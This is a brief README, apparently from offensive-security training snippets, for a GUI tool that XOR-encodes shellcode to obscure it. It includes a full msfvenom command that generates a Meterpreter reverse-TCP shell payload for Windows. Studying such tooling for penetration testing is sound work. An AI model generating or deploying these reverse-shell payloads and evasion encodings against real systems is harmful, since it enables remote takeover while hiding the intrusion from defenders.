Source: https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs

Just a simple C# application ported to GUI for ease of use that XOR a shellcode you provide with specified key.

> [!NOTE]
> Make sure to insert only the hex portion of the shellcode, e.g: `0x48, 0x4f`...<br>
> Command ran: `msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=ens33 LPORT=443 -f csharp`

![image](https://github.com/user-attachments/assets/668eca30-24c0-40ac-9a91-500bbfefe94e)

